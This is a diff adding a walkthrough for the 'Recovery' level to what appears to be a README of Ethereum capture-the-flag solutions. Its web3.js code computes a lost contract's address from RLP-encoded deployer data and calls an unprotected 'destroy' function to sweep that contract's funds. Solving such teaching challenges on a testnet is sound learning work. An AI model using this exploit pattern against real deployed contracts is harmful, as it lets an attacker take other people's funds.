@@ -108,3 +108,27 @@ See solidity function [delegatecall](https://solidity-by-example.org/delegatecal
 Compile [MadLibraryContract.sol](./solutions/MadLibraryContract.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
 Afterwards, just call the `attack1(address _preservationContract)` and `attack2(address _preservationContract)` functions with the level `instance` address as first argument.
 
+
+## 17. Recovery
+
+Contract addresses in the EVM (Ethereum Virtual Machine) are deterministic, see [How is the Ethereum contract address calculated?](https://netfreeman.com/2022/02/202202032047017508.html).  
+Furthermore, it is crucial to understand RLP (Recursive Length Prefix) coding, see [RLP | Ethereum Wiki](https://eth.wiki/fundamentals/rlp) and [Online RLP en-/decoder](https://toolkit.abdk.consulting/ethereum#rlp).  
+Assuming call to function `generateToken(string memory _name, uint256 _initialSupply)` was the first transaction of the freshly deployed `Recovery` contract: `nonce = 1`.
+```
+/*
+const tempHash = web3.utils.soliditySha3(RLP([ instance, nonce ])); // nonce = 1
+ --> RLP(nonce) = RLP(1) = "0x01"
+ --> RLP(instance) = 0x80 + bytelen(instance), instance = 0x80 + 20, instance = "0x94", instance
+ -> ... := "0x94", instance, "0x01"
+ -> RLP([ instance, nonce ]) = RLP("0x94", instance, "0x01") = 0xC0 + bytelen(...), ... = 0xC0 + 22, ... = "0xD6", ...
+*/
+const tempHash = web3.utils.soliditySha3("0xD6", "0x94", instance, "0x01");
+const contractAddress = "0x" + tempHash.slice(26); // slice '0x' and first 12 bytes -> address of lost 'SimpleToken' contract
+
+
+// Call 'destroy(address payable _to)' function of 'SimpleToken' contract to recover funds.
+const destroySig = web3.eth.abi.encodeFunctionSignature("destroy(address)"); // 'address payable' is just 'address' in ABI
+const destroyParam = web3.eth.abi.encodeParameter("address", player);
+const destroyData = destroySig + destroyParam.slice(2); // slice '0x' before concatenating hex strings
+await web3.eth.sendTransaction({ from: player, to: contractAddress, data: destroyData });
+```
